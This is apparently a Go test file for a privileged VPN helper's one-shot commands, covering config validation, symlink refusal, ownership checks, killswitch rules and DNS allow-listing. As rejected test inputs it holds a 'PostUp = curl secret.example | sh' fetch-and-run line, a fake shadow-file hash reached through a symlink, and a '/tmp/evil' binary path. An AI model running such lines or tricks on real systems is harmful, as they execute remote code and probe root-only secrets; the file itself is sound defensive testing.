package oneshot

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"katacomb.vpn/daemon/internal/ops"
)

type rec struct {
	*ops.Env
	root  string
	cmds  [][]string
	pinOK bool
}

func newRec(t *testing.T) *rec {
	t.Helper()
	root := t.TempDir()
	r := &rec{root: root, pinOK: true}
	link := func(name string) { _ = os.WriteFile(filepath.Join(root, "sys/class/net", name), nil, 0o644) }
	r.Env = &ops.Env{
		Run: func(_ context.Context, argv []string, _ ops.RunOpt) ([]byte, []byte, error) {
			r.cmds = append(r.cmds, argv)
			if b := filepath.Base(argv[0]); b == "wg-quick" || b == "awg-quick" {
				link("sntl0")
			}
			return nil, nil, nil
		},
		Spawn: func(argv []string, _ ops.RunOpt) (int, error) {
			r.cmds = append(r.cmds, argv)
			if len(argv) > 1 && argv[1] == "_tun2socks" {
				link("sntl-tun")
			}
			return 777, nil
		},
		Executable: func() (string, error) { return filepath.Join(root, "usr/local/bin/katacomb-vpn-helper"), nil },
		Kill:     func(int, syscall.Signal) error { return nil },
		Sleep:    func(time.Duration) {},
		Root:     root,
		BinDir:   filepath.Join(root, "pinned"),
		LookPath: func(name string) (string, error) { return name, nil },
		VerifyPin: func(path, name string) error {
			if r.pinOK {
				return nil
			}
			return fmt.Errorf("%s failed SHA-256 integrity check", name)
		},
		Warn: func(string) {},
	}
	for _, d := range []string{"sys/class/net", "pinned", "etc", "cfg"} {
		if err := os.MkdirAll(filepath.Join(root, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	for _, b := range []string{"pinned/tun2socks", "pinned/awg", "pinned/awg-quick", "pinned/amneziawg-go"} {
		if err := os.WriteFile(filepath.Join(root, b), []byte("#!/bin/sh\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	return r
}

func (r *rec) lines() string {
	var out []string
	for _, c := range r.cmds {
		out = append(out, strings.Join(c, " "))
	}
	return strings.Join(out, "\n")
}

func runVerb(t *testing.T, r *rec, args ...string) (int, string, string) {
	t.Helper()
	var out, errb bytes.Buffer
	code := Run(args, r.Env, &out, &errb)
	return code, out.String(), errb.String()
}

var cleanWG = func() string {
	b, err := os.ReadFile("../guard/testdata/corpus/wireguard/minimal.conf")
	if err != nil {
		panic(err)
	}
	return string(b)
}()

func writeCfg(t *testing.T, r *rec, name, content string) string {
	t.Helper()
	p := filepath.Join(r.root, "cfg", name)
	if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestUnknownVerbPrintsUsage(t *testing.T) {
	r := newRec(t)
	for _, args := range [][]string{{"frobnicate"}, {}, {"--help"}} {
		code, _, errs := runVerb(t, r, args...)
		if code != 1 || strings.TrimSpace(errs) != Usage {
			t.Fatalf("%v: code=%d stderr=%q", args, code, errs)
		}
	}
	if len(r.cmds) != 0 {
		t.Fatal("nothing may run")
	}
}

func TestUpReadsOnceAndHandsWgQuickTheRootOwnedCopy(t *testing.T) {
	r := newRec(t)
	p := writeCfg(t, r, "sntl0.conf", cleanWG)
	code, _, errs := runVerb(t, r, "up", p)
	if code != 0 {
		t.Fatalf("exit %d: %s", code, errs)
	}
	rootCopy := filepath.Join(r.root, ops.RunDir, "sntl0.conf")
	if r.lines() != "wg-quick up "+rootCopy {
		t.Fatalf("got %q", r.lines())
	}
	if b, _ := os.ReadFile(rootCopy); string(b) != cleanWG {
		t.Fatal("the bytes validated are not the bytes written")
	}
}

func TestUpRequiresTheSntl0Name(t *testing.T) {
	r := newRec(t)
	p := writeCfg(t, r, "wg0.conf", cleanWG)
	code, _, errs := runVerb(t, r, "up", p)
	if code != 1 || strings.TrimSpace(errs) != "Error: interface must be sntl0, got wg0" || len(r.cmds) != 0 {
		t.Fatalf("code=%d stderr=%q cmds=%v", code, errs, r.cmds)
	}
	for _, bad := range []string{"", "/nonexistent/sntl0.conf", filepath.Join(r.root, "cfg"), strings.TrimSuffix(p, ".conf")} {
		code, _, errs := runVerb(t, r, "up", bad)
		if code != 1 || !strings.Contains(errs, "Error: ") || len(r.cmds) != 0 {
			t.Fatalf("%q: code=%d stderr=%q", bad, code, errs)
		}
	}
}

// Deviation 6: the caller's path is opened with O_NOFOLLOW and the message
// carries no content, so a symlink to a root-only file is not a read oracle.
func TestUpRefusesASymlinkWithoutReadingIt(t *testing.T) {
	r := newRec(t)
	secret := writeCfg(t, r, "shadow", "root:$6$sekrit$hash:19000:0:99999:7:::\n")
	link := filepath.Join(r.root, "cfg", "sntl0.conf")
	if err := os.Symlink(secret, link); err != nil {
		t.Fatal(err)
	}
	code, _, errs := runVerb(t, r, "up", link)
	if code != 1 || strings.TrimSpace(errs) != "Error: invalid config path" || strings.Contains(errs, "sekrit") || len(r.cmds) != 0 {
		t.Fatalf("code=%d stderr=%q", code, errs)
	}
}

func TestUpEnforcesTheCallersOwnership(t *testing.T) {
	r := newRec(t)
	p := writeCfg(t, r, "sntl0.conf", cleanWG)
	t.Setenv("PKEXEC_UID", fmt.Sprint(os.Getuid()+1))
	code, _, errs := runVerb(t, r, "up", p)
	if code != 1 || !strings.Contains(errs, "owned by the invoking user") || len(r.cmds) != 0 {
		t.Fatalf("code=%d stderr=%q", code, errs)
	}
	t.Setenv("PKEXEC_UID", fmt.Sprint(os.Getuid()))
	if code, _, errs := runVerb(t, r, "up", p); code != 0 {
		t.Fatalf("own file must be accepted: %s", errs)
	}
}

func TestUpRejectsPostUpWithoutEchoingIt(t *testing.T) {
	r := newRec(t)
	p := writeCfg(t, r, "sntl0.conf", strings.Replace(cleanWG, "Address = 10.8.0.2/32", "PostUp = curl secret.example | sh", 1))
	code, _, errs := runVerb(t, r, "up", p)
	if code != 1 || !strings.Contains(errs, "not allowed") || strings.Contains(errs, "secret.example") || len(r.cmds) != 0 {
		t.Fatalf("code=%d stderr=%q cmds=%v", code, errs, r.cmds)
	}
}

func TestUpRejectsAnOversizedConfig(t *testing.T) {
	r := newRec(t)
	p := writeCfg(t, r, "sntl0.conf", strings.Repeat("#", 256*1024+1))
	code, _, errs := runVerb(t, r, "up", p)
	if code != 1 || !strings.Contains(errs, "too large") {
		t.Fatalf("code=%d stderr=%q", code, errs)
	}
}

func TestKillswitchOnArgvShapes(t *testing.T) {
	lan := "-d 10.0.0.0/8 -j ACCEPT"
	dns := "-d 1.1.1.1/32 -p udp --dport 53"
	cases := []struct {
		args     []string
		lan, dns bool
	}{
		{[]string{"killswitch-on", "sntl0", "203.0.113.7"}, false, false},
		{[]string{"killswitch-on", "sntl0", "203.0.113.7", "1.1.1.1"}, false, true},
		{[]string{"killswitch-on", "sntl0", "203.0.113.7", "lan-sharing"}, true, false},
		{[]string{"killswitch-on", "sntl0", "203.0.113.7", "1.1.1.1", "lan-sharing"}, true, true},
	}
	for _, c := range cases {
		r := newRec(t)
		if code, _, errs := runVerb(t, r, c.args...); code != 0 {
			t.Fatalf("%v: %s", c.args, errs)
		}
		if strings.Contains(r.lines(), lan) != c.lan || strings.Contains(r.lines(), dns) != c.dns {
			t.Errorf("%v: lan=%v dns=%v", c.args, strings.Contains(r.lines(), lan), strings.Contains(r.lines(), dns))
		}
	}
	r := newRec(t)
	if code, _, errs := runVerb(t, r, "killswitch-on", "sntl0", "0.0.0.0"); code != 1 || !strings.Contains(errs, "whitelists nothing") || len(r.cmds) != 0 {
		t.Fatalf("code=%d stderr=%q", code, errs)
	}
}

func TestTunUpPrintsThePidAndIgnoresTheBinSlot(t *testing.T) {
	self := "usr/local/bin/katacomb-vpn-helper _tun2socks -device tun://sntl-tun"
	for _, slot := range []string{"-", "/tmp/evil", "/opt/Katacomb VPN/resources/linux/bin/tun2socks"} {
		r := newRec(t)
		code, out, errs := runVerb(t, r, "tun-up", slot, "127.0.0.1:1080", "203.0.113.7", "192.168.1.1", "eth0", "10.0.0.0/8,0.0.0.0/0")
		if code != 0 || strings.TrimSpace(out) != "777" {
			t.Fatalf("slot %q: code=%d out=%q err=%q", slot, code, out, errs)
		}
		if !strings.Contains(r.lines(), self) || strings.Contains(r.lines(), slot+" ") {
			t.Fatalf("slot %q: must self-exec the embedded engine, never the slot: %s", slot, r.lines())
		}
		if !strings.Contains(r.lines(), "ip route add 10.0.0.0/8 via") || strings.Contains(r.lines(), "0.0.0.0/0") {
			t.Fatalf("bypass handling: %s", r.lines())
		}
	}
}

func TestDnsSetAllowListAppliesOneShotToo(t *testing.T) {
	r := newRec(t)
	if code, _, errs := runVerb(t, r, "dns-set", "8.8.4.4"); code != 1 || strings.TrimSpace(errs) != "Error: DNS resolver not allowed" {
		t.Fatalf("code=%d stderr=%q", code, errs)
	}
	if code, _, errs := runVerb(t, r, "dns-set", "9.9.9.9"); code != 0 {
		t.Fatalf("%s", errs)
	}
	if b, _ := os.ReadFile(filepath.Join(r.root, "etc/resolv.conf")); string(b) != "nameserver 9.9.9.9\n" {
		t.Fatalf("resolv.conf = %q", b)
	}
	if code, _, _ := runVerb(t, r, "dns-restore"); code != 0 {
		t.Fatal("restore")
	}
}

func TestAwgUpTakesTheBindirFromArgv(t *testing.T) {
	r := newRec(t)
	awg, _ := os.ReadFile("../guard/testdata/corpus/amneziawg/minimal.conf")
	p := writeCfg(t, r, "sntl0.conf", string(awg))
	code, _, errs := runVerb(t, r, "awg-up", p, filepath.Join(r.root, "pinned"))
	if code != 0 {
		t.Fatalf("%s", errs)
	}
	if !strings.HasPrefix(r.lines(), filepath.Join(r.root, "pinned", "awg-quick")+" up ") {
		t.Fatalf("got %q", r.lines())
	}
	if code, _, errs := runVerb(t, r, "awg-up", p, filepath.Join(r.root, "cfg")); code != 1 || !strings.Contains(errs, "missing from bin dir") {
		t.Fatalf("code=%d stderr=%q", code, errs)
	}
}

func TestDownVerbsRun(t *testing.T) {
	r := newRec(t)
	for _, v := range []string{"down", "awg-down", "ovpn-down", "tun-down", "killswitch-off", "dns-restore"} {
		if code, _, errs := runVerb(t, r, v); code != 0 {
			t.Fatalf("%s: %s", v, errs)
		}
	}
}
